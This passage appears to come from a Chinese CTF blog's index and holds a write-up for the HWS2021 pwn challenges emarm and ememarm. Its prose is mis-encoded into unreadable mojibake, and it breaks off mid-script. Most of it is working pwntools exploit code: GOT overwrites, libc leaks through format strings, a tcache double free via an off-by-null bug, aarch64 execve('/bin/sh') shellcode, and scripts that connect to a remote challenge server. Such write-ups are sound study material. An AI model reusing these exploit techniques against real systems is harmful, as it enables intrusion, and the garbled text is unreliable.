å®‰è£…ä¾èµ–\n```\n\nç„¶åä¿®æ”¹_config.yml\n\n```\ntheme: stun\n```\n\n# å‚è€ƒ\n\n[hexo+githubæ­å»ºä¸ªäººåšå®¢](https://www.cnblogs.com/thanksblog/p/12900165.html)\n\n[ä½¿ç”¨ Hexo+GitHub æ­å»ºä¸ªäººå…è´¹åšå®¢æ•™ç¨‹ï¼ˆå°ç™½å‘ï¼‰](https://zhuanlan.zhihu.com/p/60578464)\n\n","categories":["åŸºç¡€æŠ€èƒ½"]},{"title":"HWS2021å†¬ä»¤è¥é€‰æ‹”èµ›","url":"/2021/02/03/hws2021-winter/","content":"\nä¸€å…±æ˜¯å››é“é¢˜ç›®çš„wpï¼š\n\n- emarm\n- ememarm\n- justcode\n- blinkblink\n\nåé¢ä¸‰ä¸ªé¢˜æš‚æ—¶ä»¥wordçš„æ ¼å¼ä¸Šä¼ ï¼Œç­‰æˆ‘æœ‰ç©ºæŠŠåšå®¢æ¡†æ¶æ”¹å®Œäº†å†æ•´ç†ã€‚\n\n# emarm\n\né¢˜ç›®æ–‡ä»¶ï¼š[emarm](emarm_100.zip)\n\n## åˆ†æäºŒè¿›åˆ¶\n\né€šè¿‡å­—ç¬¦ä¸²â€œpasswordâ€åœ¨IDAä¸­å®šä½åˆ°mainå‡½æ•°ä½ç½®ï¼Œå¹¶create function\n\n![](emarm1.png)\n\nåˆ†æé¢˜ç›®é€»è¾‘åçŸ¥é“ï¼Œåªè¦ç»•è¿‡/dev/urandomå°±å¯ä»¥ä»»æ„åœ°å€å†™ã€‚\n\nè¿™é‡Œåªæ¯”è¾ƒçš„næ˜¯æ ¹æ®è¾“å…¥è°ƒæ•´çš„ï¼Œå› æ­¤æˆ‘ä»¬åªè¾“å…¥ä¸€ä¸ªå­—èŠ‚çš„ï¼Œå°±åªæ¯”è¾ƒæœ€ä½å­—èŠ‚çš„å†…å®¹ã€‚2^8çš„çˆ†ç ´å¼ºåº¦æ˜¯èƒ½æ¥å—çš„ã€‚ï¼ˆçœ‹äº†å¦ä¸€ç¯‡wpï¼Œè¯´å¯ä»¥ç›´æ¥è¾“å…¥â€™\\0â€™æ¥ç»•è¿‡strncmpï¼Œå°±ä¸ç”¨çˆ†ç ´äº†ï¼‰\n\n![](emarm2.png)\n\nç»•è¿‡urandomé™åˆ¶åï¼Œæœ‰ä¸€ä¸ªå¤©ç„¶çš„ä»»æ„åœ°å€å†™ã€‚\n\n## æ³„éœ²libc\n\næœ¬åœ°è°ƒè¯•libcåŸºå€æ˜¯0x4000847000\n\n![](emarm3.png)\n\nåˆ©ç”¨ä»»æ„åœ°å€å†™å°†atoiæ”¹æˆprintfï¼Œé€šè¿‡è¾“å…¥%n$xæ³„éœ²å¯„å­˜å™¨æˆ–æ ˆä¸Šçš„ä¿¡æ¯\n\n![](emarm4.png)\n\n0x40008676e0 - 0x4000847000 = 0x206e0\n\næ³„éœ²è¿œç¨‹çš„å€¼ï¼Œä¸º0x8506e0ã€‚å¯¹åº”è¿œç¨‹libcåœ°å€ä¸ºï¼š0x40008506e0 â€“ 0x206e0 = 0x4000830000\n\n![](emarm5.png)\n\næ³„éœ²è„šæœ¬ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# fread 0x412060 = 4268128\n# atoi 0x412020 = 4268064\n# bl .puts :0x400C64 0x400BA4 ...\n# lb .printf : 0x400c30\nwhile(1):\n    try:\n        #pr = process(['qemu-aarch64','-L','./','-g','1234','emarm'])\n        #pr = process(['qemu-aarch64','-L','./','emarm'])\n        pr = remote('183.129.189.60',10004)\n        pr.recvuntil(\"passwd:\")\n        pr.sendline('1')\n        pr.send('4268064')\n        log.warn('success!!!')\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(0x400c30))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('%9$x')\n        res = pr.recv()\n        #print p64(res.ljust(8,'\\x00'))\n        print res\n        pr.recv()\n        \n        pr.interactive()\n        break\n    except EOFError:\n        pr.close()\n\n```\n\n\n\n## æ”¹gotè¡¨é¡¹æ‰§è¡Œ\"/bin/sh\"\n\nåˆ©ç”¨ä»»æ„åœ°å€å†™æ”¹gotè¡¨é¡¹ã€‚\n\næœç´¢ç»™å®šlibcï¼Œå­˜åœ¨å¯ç”¨gadgetï¼Œé€‰æœ€åä¸€ä¸ªgadgetï¼Œçº¦æŸæ¡ä»¶è¾ƒå°‘ã€‚\n\n![](emarm6.png)\n\né€‰æ‹©freadå‡½æ•°ï¼Œå› ä¸ºå¯ä»¥æ§åˆ¶v8ä¸º0ã€‚\n\n![](emarm7.png)\n\nexpå¦‚ä¸‹\n\n```python\nrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n#pr = process('qemu-aarch64','-L','./','-g','1234','./emarm')\n#pr = process('qemu-aarch64','-L','./','./emarm')\n\nlibc_base = 0x4000830000\nexec_addr = libc_base + 0x63e80\n# 40008AAE80\n# fread 0x412060 = 4,268,128\nwhile(1):\n    try:\n        #pr = process(['qemu-aarch64','-L','./','-g','1234','emarm'])\n        pr = remote('183.129.189.60',10004)\n        pr.recvuntil(\"passwd:\")\n        pr.sendline('1')\n        pr.send('4268128')\n        log.warn('success!!!')\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(exec_addr))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('0')\n        pr.interactive()\n        break\n    except EOFError:\n        pr.close()\n\n```\n\næ‹¿åˆ°flagå¦‚ä¸‹ï¼š\n\n![](emarm8.png)\n\n## å¦ä¸€ç§è§£æ³•\n\né€šè¿‡å¤šæ¬¡å†™ï¼Œå°†shellcodeå†™åˆ°å†…å­˜ï¼Œç„¶åè·³è½¬æ‰§è¡Œ\n\n```python\nfrom  pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# fread 0x412060 = 4268128\n# 0x411f70 = 4267888\n\nsh1 = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\"\nsh2 = \"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nsh3 = \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\"\nsh4 = \"\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nsh5 = \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nwhile(1):\n    try:\n        #pr = process(['qemu-aarch64','-L','./','-g','1234','emarm'])\n        pr = process(['qemu-aarch64','-L','./','emarm'])\n        #pr = remote('183.129.189.60',10004)\n        pr.recvuntil(\"passwd:\")\n        pr.sendline('1')\n        pr.send('4268128')\n        log.warn('success!!!')\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(0x400be4))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n        pr.recv()\n\n        pr.send(str(0x412080))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh1)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n        pr.recv()\n    \n        pr.send(str(0x412088))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh2)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x412090))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh3)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x412098))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh4)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x4120a0))\n        pr.recvuntil(\"you will success\")\n        pr.send(sh5)\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.send(str(0x412060))\n        pr.recvuntil(\"you will success\")\n        pr.send(p64(0x412080))\n        pr.recvuntil(\"i leave for you bye\")\n        pr.send('4')\n\n        pr.interactive()\n        break\n    except EOFError:\n        pr.kill()\n\n```\n\n\n\n# ememarm\n\né¢˜ç›®æ–‡ä»¶ï¼š[ememarm](ememarm_200.zip)\n\n## åˆ†æ\n\narm64äºŒè¿›åˆ¶ç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œå»ç¬¦å·è¡¨ã€‚\n\n```shell\n$ file ememarm\nememarm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=407173e699ec0b33c41ef419ba897062bcee5626, stripped\n```\n\ngotè¡¨å¯å†™ï¼Œæ ˆä¿æŠ¤å¼€äº†ï¼Œå¼€äº†NXï¼ˆä½†ç”¨æ™®é€šqemu-armèµ·èµ·æ¥çš„armç¨‹åºï¼Œè¿™ä¸€é¡¹å¹¶ä¸å‡†ç¡®ï¼‰ï¼Œæœªå¼€éšæœºåŒ–ã€‚\n\n```shell\n$ checksec ememarm\n[*] '/home/bling/ctf-0128/ememarm/ememarm'\n    Arch:     aarch64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n### ä¸»è¦åŠŸèƒ½\n\nç¨‹åºåˆšå¼€å§‹çš„æ—¶å€™ï¼Œä¼šmallocä¸€ä¸ª0x20å¤§å°çš„å †å—ï¼Œå¹¶è®©æˆ‘ä»¬è¾“å…¥0x18å¤§å°çš„å†…å®¹ã€‚è¿™ä¸ªå †å—æ˜¯ç”¨ä½œå¤´ç»“ç‚¹çš„ï¼Œåé¢ç”³è¯·çš„å †å—ï¼ˆnoteå—ï¼‰éƒ½ä¼šé“¾æ¥ä¸Šæ¥ã€‚\n\n```c\n  printf(\"hello every one welcom my note  ~~%lld\\n\", &unk_412070);\n  buf = malloc(0x20uLL);\n  read(0, buf, 0x18uLL);\n```\n\nç¨‹åºä¸»è¦æ˜¯3ä¸ªåŠŸèƒ½ï¼š\n\n```c\n__int64 sub_4008E4()\n{\n  puts(\"1. request\");\n  puts(\"2. print\");\n  puts(\"3. edit\");\n  return puts(\"you choice: \");\n}\n```\n\n#### request\n\n```c\n  buf = (char *)malloc(0x20uLL);\n  puts(\"cx:\");\n  read(0, buf, 8uLL);\n  puts(\"cy:\");\n  read(0, buf + 8, 8uLL);\n```\n\nç”³è¯·0x20å¤§å°çš„å †å—ï¼Œå†™å…¥ä¸¤ä¸ª8å­—èŠ‚å†…å®¹ã€‚å†™å®Œåä¼šè®©ä½ é€‰æ‹©æ˜¯å¦deleteï¼Œè¿™æ—¶è¾“å…¥1ï¼Œä¼šå°†è¿™ä¸ªå †å—é“¾å…¥å¤´èŠ‚ç‚¹æˆ–è€…ä¸Šä¸€ä¸ªè¯·æ±‚çš„ï¼›è¾“å…¥å…¶ä»–æ•°å­—é»˜è®¤ä¸ä¼šé“¾å…¥ã€‚\n\n```c\n          puts(\"do you want delete?\");\n          __isoc99_scanf(\"%d\", &v2);\n          if ( v2 == 1 )\n            link_it(buf, v7);\n        }\n```\n\n#### print\n\nprintå‡½æ•°ä¸­æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè‡³åšäº†å‚æ•°è¢«å†™æ­»çš„putsè¾“å‡ºã€‚\n\nè¿™ä¸ªå‡½æ•°è¢«æˆ‘ç”¨æ¥å½“åšè°ƒè¯•çš„æ–­ç‚¹ï¼Œå¾ˆå¥½ç”¨ï¼\n\n#### edit\n\neditå‡½æ•°ä¸­åŠŸèƒ½è¾ƒå¤šï¼Œé—®é¢˜ä¹Ÿå‡ºåœ¨è¿™å„¿ã€‚\n\n```c\nif ( (unsigned int)read(0, v5, 0x18uLL) == 24 )\n    *((_BYTE *)v5 + 24) = 0;\nfree(v5[3]);\nresult = (ssize_t)v5;\nv5[3] = 0LL;\n```\n\nç¬¬äºŒè¡Œï¼Œå°†v5æŒ‡å‘çš„åœ°å€å½“åšBYTEç±»å‹ï¼Œå› æ­¤åœ¨èµ‹å€¼0æ—¶ï¼Œåªç»™æœ€ä½1ä¸ªbyteç½®0äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªoff by nullæ¼æ´ã€‚å¯¼è‡´åä¸€è¡Œfreeæ“ä½œå¹¶æ²¡æœ‰freeé¢„æœŸçš„åœ°å€ï¼Œäº§ç”Ÿäº†åç§»ï¼Œåˆ©ç”¨è¿™ä¸ªå¯ä»¥æ„é€ double freeã€‚é¢˜ç›®ç»™å®šçš„libcæ˜¯æœ‰tcacheçš„ï¼Œè¿™è®©æˆ‘ä»¬çš„double freeæ›´å¥½åˆ©ç”¨äº†ã€‚\n\n#### surprise\n\né™¤äº†ä»¥ä¸Šè¿™ä¸‰ä¸ªåŠŸèƒ½å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªéšè—åŠŸèƒ½â€”â€”surpise()ã€‚å®ƒå­˜åœ¨çš„ç›®çš„å°±æ˜¯ä¸ºäº†è®©æˆ‘ä»¬å¯ä»¥æ„é€ å¤šæ¬¡double freeã€‚å› ä¸ºåŒä¸€å¤§å°çš„tcacheå †å—é“¾ï¼Œåªèƒ½æ„é€ ä¸€æ¬¡double freeã€‚\n\n```shell\n  buf = (char *)malloc(0x30uLL);\n  puts(\"cx:\");\n  read(0, buf, 8uLL);\n  puts(\"cy:\");\n  read(0, buf + 8, 8uLL);\n  return buf;\n```\n\n### å…³é”®ç‚¹\n\n1. é€šè¿‡é“¾è¡¨å¯»æ‰¾noteå—ï¼Œå› æ­¤å¯ä»¥åŠ«æŒnoteå—é“¾çš„èµ°å‘\n2. double freeçš„åŒæ—¶ï¼Œå®ç°å¯¹next noteçš„åŠ«æŒã€‚äº§ç”Ÿä¸€æ¬¡æ”»å‡»ï¼Œä¸¤ä¸ªä»»æ„åœ°å€å†™çš„æ•ˆæœï¼\n\n## åˆ©ç”¨\n\n### ret2shellcode\n\n> ç”±äºarm pwné¢˜é€šå¸¸æ˜¯è·‘åœ¨qemué‡Œçš„ï¼Œqemuä¸­é»˜è®¤ä¸ä¼šæœ‰NXï¼Œå› æ­¤å¤§éƒ¨åˆ†arm pwnéƒ½å¯ä»¥ä½¿ç”¨ret2shellcodeçš„æ–¹æ³•ã€‚\n\nshellcodeæ¤å…¥çš„åœ°å€é€‰æ‹©ï¼šæ¯”è¾ƒéšæ„ï¼Œè¿™é‡Œä»¥.bssæ®µåçš„0x412080ä½œä¸ºshellcodeèµ·å§‹åœ°å€ã€‚\n\nè¿‡ç¨‹è§å¦‚ä¸‹exp\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nshellcode1 = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\"\nshellcode2 = \"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nshellcode3 = \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\"\nshellcode3 += \"\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nshellcode3 += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nscanf_got = myelf.got['__isoc99_scanf']\n\ninit_data = 'blingbling'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - åŒ…å«\\x00é¡¹ï¼Œåˆ©ç”¨â€˜\\x31â€™æ„é€ ä¸€ä¸ªä¼ªå—ï¼Œè¾¾åˆ°å†™next noteåœ°å€çš„ç›®çš„\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc - ä¸€æ¬¡double freeï¼Œå¯ä»¥æ„é€ ä¸¤æ¬¡ä»»æ„åœ°å€å†™\nrequest_i(p64(0x412080),p64(0x0),0)\nrequest_i(p64(0x0),p64(0x412090),0)\nrequest_i(shellcode1,shellcode2,0)\t# ç¬¬ä¸€æ¬¡å†™ï¼Œå°†shellcode1å’Œshellcode2(0x10 bytes)å†™åˆ°0x412080\n# one edit\nedit_i(4,shellcode3)\t#ç¬¬äºŒæ¬¡å†™ï¼Œå°†shellcode3ï¼ˆ0x18 bytesï¼‰å†™åˆ°0x412090\n\n# re-init env : 0x20å¤§å°çš„noteé“¾ç»è¿‡ä¸Šé¢çš„double freeå·²ç»æ— æ³•ç»§ç»­ç”¨äº†ã€‚æ‰€ä»¥éœ€è¦é‡æ–°åˆå§‹åŒ–noteé“¾ï¼Œä½¿ç”¨é¢˜ç›®ä¸­é¢„ç•™çš„0x30å¤§å°çš„noteã€‚è¿™é‡Œéœ€è¦é€šè¿‡è°ƒè¯•å®šä½å„noteçš„ä½ç½®ã€‚\nedit_i(1,'2'*0x10)   # 1\nsuprise_i('1','1',1) # 2\nsuprise_i('1','1',1) # 3 - åŒ…å«\\x00é¡¹\nsuprise_i('1','1',1) # 4\nsuprise_i('1','1',1) # 5\nsuprise_i('1','1',1) # 6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc - è¿™é‡ŒåŒæ ·å¯ä»¥æ„é€ ä¸¤æ¬¡ä»»æ„åœ°å€å†™ï¼Œä¸è¿‡æˆ‘ä»¬åªéœ€è¦å†™ä¸€æ¬¡å°±å¤Ÿäº†\nsuprise_i(p64(scanf_got),p64(0x1),0)\nsuprise_i(p64(0x0),p64(0x0),0)\nsuprise_i(p64(0x412080),p64(0x412080),0)  # å°†scanfçš„gotè¡¨é¡¹å†™æˆäº†shellcodeåœ°å€ã€‚surprise()æ‰§è¡Œè¿‡åï¼Œåœ¨æ‰§è¡Œ`__isoc99_scanf(\"%d\", &v2)`æ—¶ï¼Œç”±äºscanfå·²è¢«åŠ«æŒï¼Œæ•…å°†ä¼šè·³è½¬åˆ°æˆ‘ä»¬çš„shellcodeæ‰§è¡Œ\n#print_i(1)  # debug\n\npr.interactive()\n```\n\n### execve(\"/bin/sh\",0,0)\n\n#### ä¸€æ¬¡æ³„éœ²libcä¸€æ¬¡getshell\n\nprintfçš„ç¬¬ä¸€ä¸ªå‚æ•°(æ ¼å¼åŒ–å­—ç¬¦ä¸²)æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨free(v[3])ï¼Œå°†v[3]æŒ‡å‘æ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°†free gotè¡¨é¡¹æ”¹ä¸ºprintfçš„ï¼Œå°±å¯ä»¥å®ç°printf(v[3])æ³„éœ²æ ˆä¸­è·Ÿlibcç›¸å…³çš„åœ°å€äº†ã€‚\n\nåˆ©ç”¨printfæ³„éœ²æ ˆä¸­çš„libc_start_mainå‡½æ•°åœ°å€ï¼š\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\nmylibc = ELF('./lib/libc.so.6')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nscanf_got = myelf.got['__isoc99_scanf']\nputs_plt = myelf.plt['puts']\nprintf_plt = myelf.plt['printf']\n\n\ninit_data = '%9$p'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - include \\x00 addr\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc\nrequest_i(p64(0x412038),p64(0),0)       \nrequest_i(p64(0x0),p64(0x412038),0)     \nrequest_i(p64(printf_plt),'\\x68',0)\n\npr.recvuntil('you choice:')\npr.sendline(str(0x5))\n\npr.recvuntil(\"bye bye bye!!\\n\")\npr.recvline()\nstart_addr = pr.recv()[2:]\nstart_int = int(start_addr,base=16)\nlog.warn('libc_start_main+224: {:x}\\n'.format(start_int))\n\npr.interactive()\n```\n\n#### æ³„éœ²ä¸getshelläºŒåˆä¸€\n\næ³„éœ²libcæ—¶åªèƒ½æ³„éœ²ä½32ä½ï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œå†™ä¼šgotè¡¨æ—¶æ‰¾å·²ç»è§£æè¿‡çš„é¡¹ï¼Œåªéœ€è¦å°†ä½32ä½å¡«å›å»å°±å¯ä»¥äº†\n\n\n\nå¯¹äºtcacheè€Œè¨€ï¼Œdouble free + three mallocå¯ä»¥è¾¾æˆä¸€æ¬¡ä»»æ„åœ°å€å†™ä»»æ„å€¼ã€‚ä½†æ˜¯ç”±äºæœ¬é¢˜è¦æ³„éœ²libcå¿…é¡»æ›´æ”¹freeçš„gotè¡¨é¡¹ï¼Œä¼šå¯¼è‡´åç»­æ— æ³•å†åˆ©ç”¨double freeä»»æ„å†™ï¼Œä¹Ÿå°±æ— æ³•get shellã€‚\n\nä½†æ˜¯ï¼æœ¬é¢˜ä¸­è¿˜æœ‰ä¸€ä¸ªéšè—çš„ä¸æ˜“è¢«å‘ç°çš„ä»»æ„åœ°å€å†™ï¼Œé‚£å°±æ˜¯ç”³è¯·çš„noteé“¾è¡¨çš„nextè¿™ä¸ªä½ç½®ã€‚é€šè¿‡é”™ä½é‡Šæ”¾noteï¼Œå†requestï¼Œå¯ä»¥è¾¾åˆ°æ”¹nextæŒ‡é’ˆä¸ºç›®æ ‡åœ°å€çš„ç›®çš„ã€‚ç„¶åå†edit noteæ—¶ï¼Œè¾“å…¥çš„å†…å®¹å°±ä¼šå†™å…¥ç›®æ ‡åœ°å€ã€‚\n\nä»¥ä¸Šä¸¤ç§æ–¹å¼éƒ½å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯æ€è€ƒäº†å¾ˆä¹…ï¼Œå´å§‹ç»ˆæ— æ³•é€šè¿‡çº¿æ€§ç»„åˆè¾¾åˆ°get shellçš„ç›®çš„ã€‚æœ€åé‡‡ç”¨å…ˆfreeä¸¤æ¬¡ï¼Œå†mallocä¸¤æ¬¡ï¼ˆè¿™ä¸ªæ—¶å€™å·²ç»ç¡®å®šå¥½ä¸‹æ¬¡mallocæ—¶å †ç®¡ç†å™¨ä¼šåˆ†é…ç»™æˆ‘çš„chunkäº†ï¼‰ï¼Œåˆ©ç”¨ä¸¤æ¬¡editï¼ˆåä¸€æ¬¡è¿˜åˆ©ç”¨äº†off by nullï¼‰å®ç°free_gotæ”¹ä¸ºputs_pltå¹¶æ³„éœ²setbufçš„gotè¡¨é¡¹ä»è€Œå¾—åˆ°libcçš„ä½32ä½ã€‚\n\nåˆ†æè¿‡ç¨‹è§ä¸‹å›¾ï¼š\n\n\n\nexpå¦‚ä¸‹\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\nmylibc = ELF('./lib/libc.so.6')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nscanf_got = myelf.got['__isoc99_scanf']\nputs_plt = myelf.plt['puts']\n\ninit_data = 'blingbling'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - include \\x00 addr\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# double free - two malloc\nrequest_i(p64(0x412000),p64(0),0)       # æå‰å¸ƒå±€åˆ©ç”¨double freeè¦æ”¹å†™çš„åœ°å€ï¼Œæ”¹mallocä¸ºgadget\nrequest_i(p64(0x0),p64(0x412038),0)     # ä½¿noteé“¾ä¸­æœ€åä¸€ä¸ªnoteæŒ‡å‘free_got\n\n# two edit  - free(v5[3]) ==> puts(0x412000)\nedit_i(4,p64(puts_plt))\t\t\t\t\t# æ›´æ”¹é“¾ä¸Šæœ€åä¸€ä¸ªnoteçš„å€¼ï¼Œå³å°†free_gotè¡¨é¡¹æ”¹ä¸ºputs_plt\nedit_i(3,'a'*0x18)\t\t\t\t\t\t# æ›´æ”¹å€’æ•°ç¬¬äºŒä¸ªnoteçš„å€¼ï¼Œç»™å…¶0x18å­—èŠ‚ï¼Œä»è€Œè§¦å‘ä½å­—èŠ‚å†™é›¶ï¼Œå°†v5[3]ä»0x412038å˜æˆ0x412000ï¼Œé€šè¿‡puts(0x412000)ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°setbufè¡¨é¡¹(0x412000)ä¸­çš„å®é™…åœ°å€ã€‚æœ€ååˆ©ç”¨é¢˜ç›®ç»™å®šçš„libcï¼Œç¡®å®šçœŸå®libcåŠ è½½åœ°å€çš„å32ä½ã€‚ï¼ˆputsæ—¶ç”±äº\\x00æˆªæ–­ï¼Œåªèƒ½æ¥æ”¶åˆ°ä½32ä½ï¼‰ã€Šæˆ–è€…è€ƒè™‘ä½¿ç”¨printfæ­é…%pã€‹\npr.recvline()   # æ¥æ”¶ä¸€ä¸ªç©ºè¡Œ\naddr1 = pr.recvline()\nsetbuf_addr_32 = u32(addr1[:-1].ljust(4,'\\x00'))\nbase_addr_32 = setbuf_addr_32 - mylibc.symbols['setbuf']   # è®¡ç®—libc\nget_shell_addr = base_addr_32 + 0x63e80         # one gadget = 0x63e80\n\n# double free - last malloc\nrequest_i('\\x08',p32(get_shell_addr),0)     #double freeä¸­çš„ç¬¬ä¸‰æ¬¡mallocï¼Œå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼ã€‚å°†mallocçš„gotè¡¨é¡¹å†™æˆget shellçš„gadgetï¼Œåªå†™ä½32ä½ã€‚åŒæ—¶æœ€å¥½ä¿æŒå‰ä¸€é¡¹ä¸å˜ï¼Œé€šè¿‡é¢˜ç›®ç»™çš„libcå¯ä»¥ç¡®å®šå‰ä¸€é¡¹çš„æœ€ä½ä¸€ä¸ªå­—èŠ‚æ˜¯'\\x08'\n\npr.recvuntil('you choice:')\npr.sendline(str(0x1))\t\t\t\t# è§¦å‘requestä¸­çš„malloc\n# print_i(1)  \t\t\t\t\t\t# debug\npr.interactive()\n```\n\n### backup\n\nå¦ä¸€ç§æ–¹æ³•å®ç°ä¸¤æ¬¡ä»»æ„åœ°å€å†™ï¼šåˆ©ç”¨0x20å’Œ0x30çš„é“¾å„double freeä¸€æ¬¡ï¼ŒåŠ ä¸Šé”™ä½æ„é€ chunkçš„ä¸€æ¬¡ï¼Œä¸€å…±æœ‰å››æ¬¡ä»»æ„åœ°å€å†™ä»»æ„å€¼çš„èƒ½åŠ›ã€‚\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\npr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you 